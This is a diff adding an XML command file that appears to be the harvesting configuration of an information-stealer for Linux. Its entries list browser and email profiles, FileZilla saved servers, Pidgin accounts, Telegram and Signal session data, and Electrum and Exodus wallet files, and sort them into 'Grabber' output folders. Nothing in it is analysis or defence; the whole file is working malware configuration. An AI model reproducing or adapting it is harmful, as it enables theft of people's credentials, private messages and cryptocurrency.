@@ -1,0 +1,60 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Commands
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <commands>
+    <command name="2">
+      <args>
+        <string>~/snap/firefox/common/.mozilla/firefox</string>
+        <string>~/.mozilla/firefox</string>
+      </args>
+    </command>
+    <command name="2">
+      <args>
+        <string>~/.thunderbird</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.config/filezilla</string>
+        <string>sitemanager.xml;recentservers.xml</string>
+        <string>Apps/FileZilla</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.purple</string>
+        <string>accounts.xml</string>
+        <string>Apps/Pidgin</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.local/share/TelegramDesktop/tdata;~/.var/app/org.telegram.desktop/data/TelegramDesktop/tdata;~/snap/telegram-desktop/current/.local/share/TelegramDesktop/tdata</string>
+        <string>*s;????????????????/map?</string>
+        <string>Grabber/Telegram</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>/home/vm/.config/Signal;~/snap/signal-desktop/current/.config/Signal</string>
+        <string>config.json;sql/db.sqlite</string>
+        <string>Grabber/Signal</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.electrum/wallets;~/snap/electrum/current/.electrum/wallets</string>
+        <string>*wallet*</string>
+        <string>Grabber/Wallets/Electrum</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.config/Exodus</string>
+        <string>exodus.conf.json;exodus.wallet/*.seco</string>
+        <string>Grabber/Wallets/Exodus</string>
+      </args>
+    </command>
+  </commands>
+</Commands>
